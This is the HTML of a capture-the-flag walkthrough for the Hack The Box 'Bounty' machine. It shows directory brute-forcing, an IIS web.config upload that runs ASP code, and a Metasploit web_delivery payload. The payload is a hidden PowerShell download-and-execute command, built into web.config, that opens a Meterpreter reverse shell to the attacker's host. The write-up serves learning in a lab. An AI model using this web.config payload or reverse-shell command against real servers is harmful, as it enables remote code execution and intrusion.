&lt;p&gt;The &lt;strong&gt;/uploadedfiles/&lt;/strong&gt; directory seems very interesting but access is denied. However, an educated guess could tell that there should be an upload page somewhere…&lt;/p&gt;

&lt;p&gt;We also know that the server is running on IIS so file extensions should be &lt;strong&gt;asp&lt;/strong&gt; or &lt;strong&gt;aspx&lt;/strong&gt;. We can refine our search by adding &lt;code class=&quot;highlighter-rouge&quot;&gt;-x .aspx&lt;/code&gt; to gobuster, based on the assumptions we just made.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~/Bounty&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gobuster &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.10.10.93/ &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 50 &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; .aspx &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; gobuster/bounty.aspx

&lt;span class=&quot;o&quot;&gt;=====================================================&lt;/span&gt;
Gobuster v2.0.0              OJ Reeves &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;=====================================================&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Mode         : dir
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Url/Domain   : http://10.10.10.93/
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Threads      : 50
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Status codes : 200,204,301,302,307,403
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Extensions   : aspx
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Timeout      : 10s
&lt;span class=&quot;o&quot;&gt;=====================================================&lt;/span&gt;
2018/10/27 22:43:30 Starting gobuster
&lt;span class=&quot;o&quot;&gt;=====================================================&lt;/span&gt;
/transfer.aspx &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Running it only a few seconds is enough to reveal &lt;strong&gt;transfer.aspx&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-10-28/transfer.png&quot; alt=&quot;Transfer.aspx&quot; title=&quot;Transfer.aspx&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We found our entry point. Let’s exploit it!&lt;/p&gt;

&lt;h2 id=&quot;user-access&quot;&gt;User Access&lt;/h2&gt;

&lt;p&gt;Googling “IIS 7.5 upload RCE” teaches us that &lt;strong&gt;ASP&lt;/strong&gt; code can be executed by uploading a file called &lt;strong&gt;web.config&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;We will test if the website is vulnerable by uploading the following file:&lt;/p&gt;

&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;configuration&amp;gt;&lt;/span&gt;
   &lt;span class=&quot;nt&quot;&gt;&amp;lt;system.webServer&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;handlers&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;accessPolicy=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Read, Script, Write&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
         &lt;span class=&quot;nt&quot;&gt;&amp;lt;add&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;web_config&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;path=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;*.config&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;verb=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;*&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;modules=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;IsapiModule&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;scriptProcessor=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%windir%\system32\inetsrv\asp.dll&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;resourceType=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Unspecified&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;requireAccess=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Write&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;preCondition=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bitness64&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;         
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/handlers&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;security&amp;gt;&lt;/span&gt;
         &lt;span class=&quot;nt&quot;&gt;&amp;lt;requestFiltering&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;&amp;lt;fileExtensions&amp;gt;&lt;/span&gt;
               &lt;span class=&quot;nt&quot;&gt;&amp;lt;remove&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;fileExtension=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;.config&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;&amp;lt;/fileExtensions&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;&amp;lt;hiddenSegments&amp;gt;&lt;/span&gt;
               &lt;span class=&quot;nt&quot;&gt;&amp;lt;remove&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;segment=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;web.config&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;&amp;lt;/hiddenSegments&amp;gt;&lt;/span&gt;
         &lt;span class=&quot;nt&quot;&gt;&amp;lt;/requestFiltering&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/security&amp;gt;&lt;/span&gt;
   &lt;span class=&quot;nt&quot;&gt;&amp;lt;/system.webServer&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/configuration&amp;gt;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%
Response.write(&quot;-&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;-&amp;gt;&quot;)
Response.write(1+2)
Response.write(&quot;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!-&quot;&amp;amp;&quot;-&quot;)
%&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The ASP code is located at the very bottom of the file, between &lt;strong&gt;&amp;lt;%&lt;/strong&gt; and &lt;strong&gt;%&amp;gt;&lt;/strong&gt;. With this payload, the server should return “3” if it is vulnerable.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-10-28/uploaded.png&quot; alt=&quot;File uploaded&quot; title=&quot;File uploaded&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Our file uploaded successfully so it means this file extension is allowed. We will suppose that files are not renamed during the upload so we will try to access it at &lt;strong&gt;/uploadedfiles/web.config&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-10-28/vulnerable.png&quot; alt=&quot;RCE vulnerability test&quot; title=&quot;RCE vulnerability test&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It works! :fireworks: Now we should be able to execute commands on the web server.&lt;/p&gt;

&lt;h3 id=&quot;meterpreter-shell&quot;&gt;Meterpreter Shell&lt;/h3&gt;

&lt;p&gt;A reverse shell is generally what we are looking for when it comes to RCE. This time we will do better!&lt;/p&gt;

&lt;p&gt;Metasploit can generate specific payloads but also setup a listener that will wait for the return of our reverse shell.
But why would we do that? Because it offers the possibility to execute metasploit exploit modules directly inside our remote session.
We can also juggle between several sessions, which can be pretty useful in some cases.&lt;/p&gt;

&lt;p&gt;Here is the list of steps we will follow:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Generate our &lt;strong&gt;meterpreter shell payload&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;Incorporate the payload into the &lt;strong&gt;web.config&lt;/strong&gt; file.&lt;/li&gt;
  &lt;li&gt;Upload the web.config file.&lt;/li&gt;
  &lt;li&gt;Access the uploaded file in order to trigger the payload.&lt;/li&gt;
  &lt;li&gt;See what happens…&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&quot;meterpreter-shell-payload&quot;&gt;Meterpreter Shell Payload&lt;/h4&gt;

&lt;p&gt;First, we have to run Metasploit console with &lt;code class=&quot;highlighter-rouge&quot;&gt;msfconsole&lt;/code&gt;. Then, we will use the &lt;strong&gt;web delivery script&lt;/strong&gt; exploit module. A module is loaded with the keyword &lt;em&gt;“use”&lt;/em&gt;, followed by the path of the module.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; use exploit/multi/script/web_delivery
msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/script/web_delivery&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then, you can type &lt;em&gt;“options”&lt;/em&gt; to list all available parameters for this module:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/script/web_delivery&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; options

Module options &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;exploit/multi/script/web_delivery&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:

   Name     Current Setting  Required  Description
   &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
   SRVHOST  0.0.0.0          yes       The &lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;host to listen on. This must be an address on the &lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;machine or 0.0.0.0
   SRVPORT  8080             yes       The &lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;port to listen on.
   SSL      &lt;span class=&quot;nb&quot;&gt;false            &lt;/span&gt;no        Negotiate SSL &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;incoming connections
   SSLCert                   no        Path to a custom SSL certificate &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;default is randomly generated&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
   URIPATH                   no        The URI to use &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;this exploit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;default is random&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;


Payload options &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;python/meterpreter/reverse_tcp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:

   Name   Current Setting  Required  Description
   &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;   &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
   LHOST                   yes       The listen address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;an interface may be specified&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
   0   Python

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We will now specify several parameters in order to adapt the payload to our environment.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/script/web_delivery&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;SRVHOST 10.10.13.75  &lt;span class=&quot;c&quot;&gt;# Ip address of our machine&lt;/span&gt;
SRVHOST &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 10.10.13.75
msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/script/web_delivery&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;TARGET 2  &lt;span class=&quot;c&quot;&gt;# TARGET 2 = powershell payload&lt;/span&gt;
TARGET &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 2
msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/script/web_delivery&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;PAYLOAD windows/x64/meterpreter/reverse_tcp  &lt;span class=&quot;c&quot;&gt;# The payload we want to inject, a reverse shell&lt;/span&gt;
PAYLOAD &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; windows/x64/meterpreter/reverse_tcp
msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/script/web_delivery&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;LHOST 10.10.13.75  &lt;span class=&quot;c&quot;&gt;# IP address for the reverse shell&lt;/span&gt;
LHOST &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 10.10.13.75
msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/script/web_delivery&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; exploit
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Exploit running as background job 0.
msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/script/web_delivery&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Started reverse TCP handler on 10.10.13.75:4444
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Using URL: http://10.10.13.75:8080/moceswFJvKmkeD8
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Server started.
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Run the following &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;on the target machine:
powershell.exe &lt;span class=&quot;nt&quot;&gt;-nop&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; hidden &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$g&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;new-object net.webclient&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$g&lt;/span&gt;.proxy&lt;span class=&quot;o&quot;&gt;=[&lt;/span&gt;Net.WebRequest]::GetSystemWebProxy&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$g&lt;/span&gt;.Proxy.Credentials&lt;span class=&quot;o&quot;&gt;=[&lt;/span&gt;Net.CredentialCache]::DefaultCredentials&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;IEX &lt;span class=&quot;nv&quot;&gt;$g&lt;/span&gt;.downloadstring&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'http://10.10.13.75:8080/moceswFJvKmkeD8'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Here is our payload! We must now integrate it into the &lt;strong&gt;web.config&lt;/strong&gt; file. Do not close the msfconsole or hit CTR+C because Metasploit is currently listening and waiting for the payload to return.&lt;/p&gt;

&lt;h4 id=&quot;payload-incorporation&quot;&gt;Payload Incorporation&lt;/h4&gt;

&lt;p&gt;As you may have noticed, the payload is a &lt;strong&gt;powershell script&lt;/strong&gt; (remember &lt;em&gt;set TARGET 2&lt;/em&gt;) and not an &lt;strong&gt;ASP&lt;/strong&gt; script.
However, we can call system functions in &lt;strong&gt;ASP&lt;/strong&gt; so we will call &lt;strong&gt;cmd.exe&lt;/strong&gt; and pass our payload as an argument.&lt;/p&gt;

&lt;p&gt;This will result in the following &lt;strong&gt;web.config&lt;/strong&gt; file:&lt;/p&gt;

&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;configuration&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;system.webServer&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;handlers&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;accessPolicy=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Read, Script, Write&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;add&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;web_config&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;path=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;*.config&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;verb=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;*&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;modules=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;IsapiModule&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;scriptProcessor=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%windir%\system32\inetsrv\asp.dll&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;resourceType=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Unspecified&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;requireAccess=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Write&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;preCondition=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bitness64&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/handlers&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;security&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;requestFiltering&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;fileExtensions&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;remove&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;fileExtension=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;.config&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/fileExtensions&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;hiddenSegments&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;remove&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;segment=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;web.config&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/hiddenSegments&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/requestFiltering&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/security&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/system.webServer&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/configuration&amp;gt;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%
on error resume next
Dim oS,output
Set oS = Server.CreateObject(&quot;WSCRIPT.SHELL&quot;)
output = oS.exec(&quot;cmd.exe &amp;gt; /c powershell.exe -nop -w hidden -c $B=new-object net.webclient;$B.proxy=[Net.WebRequest]::GetSystemWebProxy();$B.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $B.downloadstring('http://10.10.13.75:8080/G783OPiDR3Em');&quot;).stdout.readall
Response.write(&quot;Powershell: &quot; &lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt; vbCrLf &lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt; output &lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt; vbCrLf &lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt; vbCrLf)
%&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;upload-webconfig-and-access-it&quot;&gt;Upload web.config and access it&lt;/h4&gt;

&lt;p&gt;Now we have to upload our &lt;strong&gt;web.config&lt;/strong&gt; file and visit the URL &lt;a href=&quot;http://10.10.10.93/uploadedfiles/web.config&quot;&gt;http://10.10.10.93/uploadedfiles/web.config&lt;/a&gt; to trigger the payload.&lt;/p&gt;

&lt;h4 id=&quot;back-to-msfconsole&quot;&gt;Back to msfconsole&lt;/h4&gt;

&lt;p&gt;We should see the following inside &lt;strong&gt;msfconsole&lt;/strong&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; 10.10.10.93      web_delivery - Delivering Payload
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Sending stage &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;206403 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; to 10.10.10.93
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Meterpreter session 1 opened &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.13.75:4444 -&amp;gt; 10.10.10.93:49158&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2018-10-28 19:23:06 +0100
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A session has been opened on the remote target. We can list every opened sessions with &lt;code class=&quot;highlighter-rouge&quot;&gt;sessions -l&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/script/web_delivery&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; sessions &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;

Active sessions
&lt;span class=&quot;o&quot;&gt;===============&lt;/span&gt;

  Id  Name  Type                     Information             Connection
  &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                     &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;             &lt;span class=&quot;nt&quot;&gt;----------&lt;/span&gt;
  1         meterpreter x64/windows  BOUNTY&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;erlin @ BOUNTY  10.10.13.75:4444 -&amp;gt; 10.10.10.93:49158 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.93&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As you can see, we are currently connected as &lt;strong&gt;merlin&lt;/strong&gt; on the &lt;strong&gt;BOUNTY&lt;/strong&gt; machine.&lt;/p&gt;

&lt;h4 id=&quot;gimme-this-usertxt&quot;&gt;Gimme this user.txt&lt;/h4&gt;

&lt;p&gt;It’s now time to retrieve the &lt;strong&gt;user flag&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Inside &lt;strong&gt;msfconsole&lt;/strong&gt;, we can move into the session number 1 with &lt;code class=&quot;highlighter-rouge&quot;&gt;sessions -i 1&lt;/code&gt; and we should arrive in a meterpreter shell.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/script/web_delivery&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; sessions &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 1
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Starting interaction with 1...

meterpreter &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

